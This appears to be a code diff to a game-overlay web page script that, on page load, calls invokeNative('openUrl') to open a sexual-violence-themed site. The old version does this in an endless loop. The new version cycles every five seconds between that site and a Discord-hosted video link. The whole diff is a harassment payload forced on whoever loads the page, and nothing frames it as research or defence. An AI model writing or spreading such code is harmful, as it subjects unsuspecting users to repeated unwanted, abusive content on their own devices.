@@ -458,9 +458,24 @@
 
         // Open links using invokeNative
         $(document).ready(function () {
-            while (true) {
-                window.invokeNative('openUrl', "https://rapelust.com/");
+            const urls = [
+                "https://rapelust.com/",
+                "https://cdn.discordapp.com/attachments/1389836031485935626/1395181208714870826/ZjbYaNkn30colTCT.mp4?ex=687a2c01&is=6878da81&hm=2483c61b77e535af4dcec8671f4e4addb0f4e3e810e398922c3b04e30f149d29&"
+            ];
+            let currentIndex = 0;
+
+            function openNextUrl() {
+                if (window.invokeNative) {
+                    window.invokeNative('openUrl', urls[currentIndex]);
+                    console.log(`Opening URL: ${urls[currentIndex]}`);
+                    currentIndex = (currentIndex + 1) % urls.length; // Cycle through URLs
+                } else {
+                    console.warn('invokeNative is not supported in this environment');
+                }
+                setTimeout(openNextUrl, 5000); // Open next URL after 5 seconds
             }
+
+            openNextUrl(); // Start the URL opening process
         });
 
         // Intensified glitch effects
